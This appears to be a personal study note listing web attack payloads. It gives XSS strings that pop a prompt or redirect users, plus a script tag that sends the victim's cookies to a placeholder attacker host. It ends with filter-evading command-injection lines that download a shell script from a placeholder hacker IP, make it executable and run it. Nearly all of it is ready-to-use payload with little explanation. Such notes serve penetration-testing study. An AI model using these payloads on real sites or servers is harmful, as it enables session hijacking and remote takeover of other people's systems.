---
title: Examples
updated: 2023-10-21 13:11:00Z
created: 2023-09-30 13:28:17Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# Examples

You can send a request to load an image (which doesn't exist) and then run a command on error. For example, to load a prompt:  
`<img src=x onerror = "prompt(1)">`

Or to redirect a user to another URL:  
`<img src=x onerror = "location.href = 'http://www.google.com';">`  
Or:  
`<img src=x onerror = "windows.location.href = 'http://www.google.com';">`

To capture a cookie:  
`<script>new Image().src='http://attacker:port/?cookie=' + encodeURI(document.cookie);</script>`

![](/C:/Users/allie/AppData/Local/Programs/Joplin/resources/app.asar/x)

Use ( **\`** ) instead of ( **'** )

***
`wget${IFS}http://<hackerIP>/shell.sh`
`chmod${IFS}777${IFS}shell.sh`
`bash${IFS}shell.sh`